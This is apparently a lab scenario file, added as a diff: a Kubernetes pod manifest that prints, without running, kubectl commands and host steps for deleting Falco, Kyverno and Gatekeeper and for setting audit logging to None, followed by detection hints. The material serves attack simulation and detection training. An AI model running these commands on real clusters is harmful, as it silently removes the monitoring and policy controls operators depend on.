@@ -1,0 +1,43 @@
+# KOAD-S23: Disable or Modify Security Tools
+# ATT&CK: T1685 — Disable or Modify Tools
+# Attack: Delete Falco DaemonSet, modify Audit Policy, remove Kyverno
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: security-disabler
+  namespace: koad
+  labels:
+    koad-scenario: S23
+    mitre-attck: T1685
+spec:
+  serviceAccountName: overprivileged-sa
+  containers:
+    - name: disabler
+      image: bitnami/kubectl:latest
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S23: Disable Security Tools ==="
+          echo ""
+          echo "Attack 1 — Delete Falco:"
+          echo "  kubectl delete ds falco -n falco"
+          echo "  kubectl delete ns falco"
+          echo ""
+          echo "Attack 2 — Modify Audit Policy to None:"
+          echo "  # On host: edit /etc/kubernetes/audit-policy.yaml"
+          echo "  # Set level: None for all resources"
+          echo "  # Restart API server"
+          echo ""
+          echo "Attack 3 — Remove Kyverno Policies:"
+          echo "  kubectl delete clusterpolicy --all"
+          echo "  kubectl delete ds kyverno -n kyverno"
+          echo ""
+          echo "Attack 4 — Disable OPA/Gatekeeper:"
+          echo "  kubectl delete validatingwebhookconfiguration gatekeeper-validating-webhook-configuration"
+          echo ""
+          echo "Detection:"
+          echo "  - Falco self-monitoring rule"
+          echo "  - RBAC restriction on security namespaces"
+          echo "  - Audit log for delete operations on DaemonSet/Policy"
+          sleep infinity
